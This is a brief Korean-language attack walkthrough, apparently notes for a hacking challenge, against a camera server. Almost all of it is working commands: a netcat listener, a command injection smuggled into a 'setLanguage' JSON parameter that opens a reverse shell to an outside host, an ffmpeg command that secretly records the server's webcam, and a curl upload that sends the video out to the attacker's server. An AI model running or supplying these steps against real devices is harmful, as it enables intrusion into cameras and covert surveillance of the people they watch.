# 1. chall
hack_chall.py 실행

# 2. Camera Server
- ip는 조정 필요함
```bash
1. nc -lvnp 9000

2. ifconfig --> chall 서버의 ip 확인

3. curl -k -X POST "http://211.222.57.18:8080/" -H "Content-Type: application/json" -d '{"method":"setLanguage","params":{"payload":"ncat 158.179.173.80 9000 -e /bin/bash"}}'
```

# 3. In Camera Server
```bash
ffmpeg -f v4l2 -input_format yuyv422 -video_size 1280x720 -framerate 30 -i /dev/video0 -c:v libx264 -preset ultrafast -t 5 video.mp4
```

## mp4 파일 만들고 난 뒤
## In My Server
http_server.py 실행

## In Docker
```bash
curl -X POST http://158.179.173.80:9001 --data-binary @video.mp4
```